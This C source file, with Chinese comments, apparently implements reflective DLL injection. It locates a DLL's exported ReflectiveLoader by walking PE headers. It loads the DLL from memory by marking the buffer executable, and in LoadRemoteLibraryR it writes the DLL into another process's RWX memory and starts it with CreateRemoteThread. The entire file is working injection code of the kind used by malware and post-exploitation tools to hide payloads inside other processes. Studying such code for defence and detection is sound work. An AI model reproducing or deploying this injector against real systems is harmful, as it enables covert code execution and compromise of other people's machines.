
#include "LoadLibraryR.h"
#include <stdio.h>

// 将RVA地址转化为文件偏移
DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress) {
	// 得到nt头在内存中的实际地址
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	// 获得节表
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

	// 不在任意块内
	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;

	// 通过遍历块，来找到相对偏移地址对应的文件偏移地址
	for (WORD wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++) {
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
	}

	return 0;
}

// 获取DLL中反射加载函数的地址
DWORD GetReflectiveLoaderOffset(void* lpReflectiveDllBuffer) {
	// 判断位数
#ifdef WIN_X64
	DWORD dwCompiledArch = 2;
#else
	// 这将捕获 Win32 和 WinRT。
	DWORD dwCompiledArch = 1;
#endif

	//基址->在Dropper进程中开辟的堆空间的起始地址
	UINT_PTR uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// 获取模块 NT Header 的文件偏移量
	UINT_PTR uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// 检查与dwCompiledArch位数是否相同
	if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) { // PE32
		if (dwCompiledArch != 1)
			return 0;
	} else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) { // PE64
		if (dwCompiledArch != 2)
			return 0;
	} else {
		return 0;
	}

	// 获得导出表结构体指针的地址
	UINT_PTR uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// 获取导出表结构体的文件偏移量
	uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

	// 获取导出表名称数组的文件偏移量
	uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

	// 获取导出函数地址表的文件偏移量
	UINT_PTR uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

	// 获取函数序号地址表的文件偏移量
	UINT_PTR uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

	// 获取导出函数的数量
	DWORD dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

	// 遍历所有导出的函数以找到 ReflectiveLoader
	while (dwCounter--) {
		// 这里需要将获取到的各表的RVA转化为各表实际的文件偏移
		char* cpExportedFunctionName = (char*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

		if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL) {
			// 获取地址表起始地址的实际位置
			uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

			// 根据序号找到序号对应的函数地址
			uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

			// 返回ReflectiveLoader函数的文件偏移，即函数机器码的起始地址
			return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
		}
		// 获取下一个导出的函数名
		uiNameArray += sizeof(DWORD);

		// 获取下一个导出的函数名序数
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}

// 通过其导出的 ReflectiveLoader 函数从内存中加载 DLL 映像
HMODULE WINAPI LoadLibraryR(LPVOID lpBuffer, DWORD dwLength) {
	HMODULE hResult = NULL;

	if (lpBuffer == NULL || dwLength == 0)
		return NULL;
	try {
		// 检查库是否有 ReflectiveLoader...
		DWORD dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
		if (dwReflectiveLoaderOffset != 0) {
			REFLECTIVELOADER pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);

			// 我们必须对 RWX 的缓冲区进行 VirtualProtect，这样我们才能执行 ReflectiveLoader...
			// 这里假设 lpBuffer 是页面区域的基地址，dwLength 是区域的大小
			DWORD dwOldProtect = 0;
			if (VirtualProtect(lpBuffer, dwLength, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
				// 调用库 ReflectiveLoader...
				DLLMAIN pDllMain = (DLLMAIN)pReflectiveLoader();
				if (pDllMain != NULL) {
					// 调用加载的库 DllMain 以获取其 HMODULE
					if (!pDllMain(NULL, DLL_QUERY_HMODULE, &hResult))
						hResult = NULL;
				}
				// 恢复到以前的保护标志...
				VirtualProtect(lpBuffer, dwLength, dwOldProtect, &dwOldProtect);
			}
		}
	} catch (...) {
		hResult = NULL;
	}

	return hResult;
}
//================================================= ================================================//
// 通过dll导出的 ReflectiveLoader 函数将DLL从内存加载到目标进程的地址空间
// 注意：你必须编译你用 REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR 注入的任何东西为了使用正确的 RDI 原型而定义。
// 注意：hProcess 句柄必须具有以下访问权限： PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
// 注意：如果你传入一个 lpParameter 值，如果它是一个指针，请记住它是针对不同的地址空间的。
HANDLE WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter) {
	HANDLE hThread = NULL;

	try {

		do {
			if (!hProcess || !lpBuffer || !dwLength)
				break;

			// 获取加载器的地址（文件偏移）
			DWORD dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
			if (!dwReflectiveLoaderOffset)
				break;

			// 在目标进程分配内存（RWX）
			LPVOID lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (!lpRemoteLibraryBuffer)
				break;

			// 写数据
			if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
				break;

			// 线程函数的地址 = 基地址 + 文件偏移
			LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

			// 创建远程线程执行函数
			DWORD dwThreadId = NULL;
			hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId);

		} while (FALSE);

	} catch (...) {
		hThread = NULL;
	}

	return hThread;
}
